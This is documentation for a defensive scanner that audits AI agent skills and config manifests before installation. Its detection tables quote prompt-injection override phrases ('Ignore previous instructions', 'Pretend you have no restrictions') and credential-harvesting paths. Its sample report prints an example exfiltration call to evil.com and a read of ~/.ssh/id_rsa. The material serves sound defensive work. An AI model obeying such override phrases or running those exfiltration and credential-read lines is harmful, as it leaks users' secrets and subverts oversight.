---
title: "Skill Security Auditor — Autonomous Guardrails & Threat Modeling"
description: "Use when security-auditing an AI agent skill or agent config before installation: evaluating a skill from an untrusted source, auditing a skill."
---

# Skill Security Auditor

<div class="page-meta" markdown>
<span class="meta-badge">:material-shield-lock: Autonomy & Security</span>
<span class="meta-badge">:material-identifier: `skill-security-auditor`</span>
<span class="meta-badge">:material-github: <a href="https://github.com/ChristianGGJ/agentic-config-hub/tree/main/skills/skill-security-auditor/SKILL.md">Source</a></span>
</div>

<div class="install-banner" markdown>
<span class="install-label">Install:</span> <code>claude /plugin install autonomy-security</code>
</div>


Scan and audit AI agent skills for security risks before installation. Produces a
clear **PASS / WARN / FAIL** verdict with findings and remediation guidance.

## Quick Start

```bash
# Audit a local skill directory
python3 scripts/skill_security_auditor.py /path/to/skill-name/

# Audit a skill from a git repo
python3 scripts/skill_security_auditor.py https://github.com/user/repo --skill skill-name

# Audit with strict mode (any WARN becomes FAIL)
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --strict

# Output JSON report
python3 scripts/skill_security_auditor.py /path/to/skill-name/ --json

# Audit the auto-execution surface: MCP servers, hooks, permission grants
python3 scripts/manifest_auditor.py /path/to/skill-or-project/
python3 scripts/manifest_auditor.py /path/to/.mcp.json --json
```

Two complementary scanners ship with this skill:

| Script | Audits | Attack surface |
|--------|--------|----------------|
| `scripts/skill_security_auditor.py` | Skill **code + prose + deps + file tree** | What a script *does* once you run it |
| `scripts/manifest_auditor.py` | Agent **manifests** (`.mcp.json`, `settings.json`, hooks) | What runs **automatically** the moment an agent loads the project |

Run both for a full pre-install gate — the manifest surface auto-executes without
a human ever reading a line of code, so it is audited separately and always.

## What Gets Scanned

### 1. Code Execution Risks (Python/Bash Scripts)

Scans all `.py`, `.sh`, `.bash`, `.js`, `.ts` files for:

| Category | Patterns Detected | Severity |
|----------|-------------------|----------|
| **Command injection** | `os.system()`, `os.popen()`, `subprocess.call(shell=True)`, backtick execution | 🔴 CRITICAL |
| **Code execution** | `eval()`, `exec()`, `compile()`, `__import__()` | 🔴 CRITICAL |
| **Obfuscation** | base64-encoded payloads, `codecs.decode`, hex-encoded strings, `chr()` chains | 🔴 CRITICAL |
| **Network exfiltration** | `requests.post()`, `urllib.request`, `socket.connect()`, `httpx`, `aiohttp` | 🔴 CRITICAL |
| **Credential harvesting** | reads from `~/.ssh`, `~/.aws`, `~/.config`, env var extraction patterns | 🔴 CRITICAL |
| **File system abuse** | writes outside skill dir, `/etc/`, `~/.bashrc`, `~/.profile`, symlink creation | 🟡 HIGH |
| **Privilege escalation** | `sudo`, `chmod 777`, `setuid`, cron manipulation | 🔴 CRITICAL |
| **Unsafe deserialization** | `pickle.loads()`, `yaml.load()` (without SafeLoader), `marshal.loads()` | 🟡 HIGH |
| **Subprocess (safe)** | `subprocess.run()` with list args, no shell | ⚪ INFO |

### 2. Prompt Injection in SKILL.md

Scans SKILL.md and all `.md` reference files for:

| Pattern | Example | Severity |
|---------|---------|----------|
| **System prompt override** | "Ignore previous instructions", "You are now..." | 🔴 CRITICAL |
| **Role hijacking** | "Act as root", "Pretend you have no restrictions" | 🔴 CRITICAL |
| **Safety bypass** | "Skip safety checks", "Disable content filtering" | 🔴 CRITICAL |
| **Hidden instructions** | Zero-width characters, HTML comments with directives | 🟡 HIGH |
| **Excessive permissions** | "Run any command", "Full filesystem access" | 🟡 HIGH |
| **Data extraction** | "Send contents of", "Upload file to", "POST to" | 🔴 CRITICAL |

> Injection-signature overlap with **ai-security** is intentional: that skill assesses a
> *running* LLM system's runtime inputs (MITRE ATLAS mapping, jailbreak robustness),
> while this one statically audits a *packaged skill's files pre-install*. Different
> context, same signatures — see also `ai-security`.

### 3. Dependency Supply Chain

The scanner uses **offline heuristics only** — it makes **no network calls** and does
**not** query any advisory database. It reads `requirements.txt` and scans scripts for
inline install commands:

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Typosquatting** | Match `requirements.txt` names against a built-in list of common misspellings of popular packages (e.g., `reqeusts` → `requests`) | 🟡 HIGH |
| **Unpinned versions** | Flag `requests>=2.0` vs `requests==2.31.0` in `requirements.txt` | ⚪ INFO |
| **Runtime install commands** | `pip install` / `npm install` / `yarn add` / `pnpm add` inside scripts | 🟡 HIGH |

> **Offline-only — layer real CVE tooling for actual advisory data.** This scanner
> does not know whether a *correctly named, pinned* package has a published CVE, and it
> does not parse `package.json` dependency trees. It only flags the heuristics above.
> Before trusting a skill, run a real advisory scanner against its dependency manifests:
>
> ```bash
> pip-audit -r requirements.txt          # Python, PyPA advisory DB
> npm audit --omit=dev                   # Node, npm advisory DB
> osv-scanner --lockfile requirements.txt  # cross-ecosystem, OSV DB
> ```
>
> Typosquat/unpinned findings from this tool are a *first-pass filter*; a clean result
> here does **not** mean the dependencies are free of known vulnerabilities.

### 4. File System & Structure

| Check | What It Does | Severity |
|-------|-------------|----------|
| **Boundary violation** | Scripts referencing paths outside skill directory | 🟡 HIGH |
| **Hidden files** | `.env`, dotfiles that shouldn't be in a skill | 🟡 HIGH |
| **Binary files** | Unexpected executables, `.so`, `.dll`, `.exe` | 🔴 CRITICAL |
| **Large files** | Files >1MB that could hide payloads | ⚪ INFO |
| **Symlinks** | Symbolic links pointing outside skill directory | 🔴 CRITICAL |

### 5. Agent Manifests & Auto-Execution Surface

> Scanned by `scripts/manifest_auditor.py` — the **primary auto-execution surface**.

Skills and projects ship configuration files that make code run *automatically* when an
agent loads the project, before a human reads any script. This is the most dangerous and
least-reviewed surface. `manifest_auditor.py` scans it separately:

| Manifest | Found by | What gets checked |
|----------|----------|-------------------|
| **`.mcp.json`** | filename, any depth | MCP `command`/`args` (pipe-to-shell, inline shell/code, `npx -y`/`uvx` auto-fetch, netcat, base64), remote `url`/`type` (plaintext HTTP, external context egress), hardcoded secrets in `env` |
| **`settings.json` / `settings.local.json`** | filename | `permissions.defaultMode` (`bypassPermissions` → CRITICAL, `acceptEdits` → MEDIUM), broad/dangerous `permissions.allow` grants, `enableAllProjectMcpServers`, every `hooks.<Event>` command, `apiKeyHelper` |
| **`hooks.json`** | filename | Plugin hook commands per event |
| **`plugin.json`** | filename | Inline `hooks` / `mcpServers` declared by a foreign plugin |
| **`.git/hooks/*`** | active (non-`.sample`) | Git hooks that auto-run on git operations, body scanned for dangerous commands |
| **`.githooks/*`, `.husky/*`** | directory | Shared / Husky git hooks |
| **`.git/config`** | `core.hooksPath` | Hook relocation that hides auto-run scripts elsewhere |

Every auto-run entry is reported with a severity (`CRITICAL`/`HIGH`/`MEDIUM`/`INFO`) and a
JSON-path locator (e.g. `mcpServers.fetcher.command`, `hooks.Stop[*]`). Exit code is `1`
when any `HIGH`/`CRITICAL` finding exists (`--strict` also fails on `MEDIUM`), so it drops
straight into a CI gate.

```bash
python3 scripts/manifest_auditor.py ./skills/new-skill/          # text report
python3 scripts/manifest_auditor.py ./project/ --json --strict   # CI gate
python3 scripts/manifest_auditor.py ./project/.mcp.json          # single file
```

**Why a dedicated tool.** In the hub's [5-Phase Protocol](https://github.com/ChristianGGJ/agentic-config-hub/tree/main/skills\agentic-system-architect\references\hitl_defensive_architectures.md),
anything that executes without an explicit **HUMAN GATE** is a defensive gap. Auto-run
manifests *are* that gap — they run before Discovery even begins. This tool inventories
them so they can be reviewed and gated rather than trusted silently. See
`agentic-system-architect` for the underlying gate/loop theory; this skill only enforces
the manifest-level check.

## Audit Workflow

1. **Run the scanner** on the skill directory or repo URL
2. **Review the report** — findings grouped by severity
3. **Verdict interpretation:**
   - **✅ PASS** — No critical or high findings. Safe to install.
   - **⚠️ WARN** — High/medium findings detected. Review manually before installing.
   - **❌ FAIL** — Critical findings. Do NOT install without remediation.
4. **Remediation** — each finding includes specific fix guidance

## Reading the Report

```
╔══════════════════════════════════════════════╗
║  SKILL SECURITY AUDIT REPORT                ║
║  Skill: example-skill                        ║
║  Verdict: ❌ FAIL                            ║
╠══════════════════════════════════════════════╣
║  🔴 CRITICAL: 2  🟡 HIGH: 1  ⚪ INFO: 3    ║
╚══════════════════════════════════════════════╝

🔴 CRITICAL [CODE-EXEC] scripts/helper.py:42
   Pattern: eval(user_input)
   Risk: Arbitrary code execution from untrusted input
   Fix: Replace eval() with ast.literal_eval() or explicit parsing

🔴 CRITICAL [NET-EXFIL] scripts/analyzer.py:88
   Pattern: requests.post("https://evil.com/collect", data=results)
   Risk: Data exfiltration to external server
   Fix: Remove outbound network calls or verify destination is trusted

🟡 HIGH [FS-BOUNDARY] scripts/scanner.py:15
   Pattern: open(os.path.expanduser("~/.ssh/id_rsa"))
   Risk: Reads SSH private key outside skill scope
   Fix: Remove filesystem access outside skill directory

⚪ INFO [DEPS-UNPIN] requirements.txt:3
   Pattern: requests>=2.0
   Risk: Unpinned dependency may introduce vulnerabilities
   Fix: Pin to specific version: requests==2.31.0
```

## Advanced Usage

### Audit a Skill from Git Before Cloning

```bash
# Clone to temp dir, audit, then clean up
python3 scripts/skill_security_auditor.py https://github.com/user/skill-repo --skill my-skill --cleanup
```

### CI/CD Integration

```yaml
# GitHub Actions step
- name: "audit-skill-security"
  run: |
    python3 skill-security-auditor/scripts/skill_security_auditor.py ./skills/new-skill/ --strict --json > audit.json
    if [ $? -ne 0 ]; then echo "Security audit failed"; exit 1; fi
```

### Batch Audit

```bash
# Audit all skills in a directory
for skill in skills/*/; do
  python3 scripts/skill_security_auditor.py "$skill" --json >> audit-results.jsonl
done
```

### Host Safety: Auditing Untrusted Repos

Auditing a hostile repo is safer than *running* it, but the clone and read steps are not
zero-risk. `clone_repo` is hardened to reduce the blast radius:

- `--no-recurse-submodules` — a malicious `.gitmodules` can redirect fetches to
  attacker-controlled URLs; submodules are never fetched.
- `GIT_TERMINAL_PROMPT=0` — never pauses for (or leaks) credentials to a hostile server.

`git clone` does **not** execute a remote repo's hooks, and this tool never runs the
skill's code — it only reads files. For genuinely untrusted sources, still add host
isolation the tool cannot provide itself:

- Run the whole audit inside a **container or throwaway VM** as a low-privilege user.
- Cut **outbound network** after the clone (audit is fully offline).
- **Never run** any `setup`/`install`/`postinstall` step the skill suggests until after
  the audit passes — run `manifest_auditor.py` first to surface auto-run wiring.
- Treat a repo that fails to clone cleanly as suspect; do not retry with looser flags.

### False-Positive Calibration

`base64`/hex/`chr()` obfuscation patterns are high-signal only when they feed an
execution sink; on their own they flood legitimate skills (avatar decoding, checksums,
data parsing). Three mechanisms keep the signal high without hiding evidence:

1. **Context weighting (default on).** An `OBFUSCATION` finding is kept `CRITICAL` only
   when the *same file* also contains an exec/command sink (`eval`/`exec`/`compile`/
   `os.system`/`subprocess(shell=True)`). Otherwise it is **downgraded to `INFO`** (not
   removed) with an explanatory note. Disable with `--no-context-weighting`.
2. **Inline suppression.** A reviewer annotates a specific line:
   ```python
   blob = base64.b64decode(payload)   # audit-ignore: OBFUSCATION
   value = eval(expr)                 # nosec
   ```
   A bare `# audit-ignore` / `# nosec` suppresses every finding on the line;
   `# audit-ignore: CAT1,CAT2` suppresses only those categories. Works with `#` and `//`.
3. **Baseline allowlist.** Accept the current findings, then fail only on *new* ones:
   ```bash
   python3 scripts/skill_security_auditor.py ./skill/ --write-baseline .audit-baseline.json
   python3 scripts/skill_security_auditor.py ./skill/ --baseline .audit-baseline.json --strict
   ```
   Fingerprints are `category + skill-relative-path + matched-text` (line-number
   independent, so edits above a finding do not invalidate the baseline). Suppressed
   counts are always reported so nothing is silently dropped.

## Threat Model Reference

For the complete threat model, detection patterns, and known attack vectors against AI agent skills, see [references/threat-model.md](https://github.com/ChristianGGJ/agentic-config-hub/tree/main/skills/skill-security-auditor/references/threat-model.md).

## Limitations

- Cannot detect logic bombs or time-delayed payloads with certainty
- Obfuscation detection is pattern-based — a sufficiently creative attacker may bypass it
- Does **not** perform network destination reputation checks — a trusted-looking URL is not verified against any threat feed; treat every outbound call as untrusted until you confirm it
- Does not execute code — static analysis only (safe but less complete than dynamic analysis)
- Dependency checks are **offline heuristics only** (typosquat/unpinned/runtime-install), not live CVE lookups — layer `pip-audit`/`npm audit`/`osv-scanner` for real advisory data (see [Dependency Supply Chain](#3-dependency-supply-chain))
- Context weighting downgrades (never hides) obfuscation findings with no exec sink in the same file; a payload split across files can slip to `INFO` — use `--no-context-weighting` for maximum sensitivity
- `manifest_auditor.py` reasons about *declared* manifests; it cannot see runtime-injected MCP servers or hooks added after install

When in doubt after an audit, **don't install**. Ask the skill author for clarification.
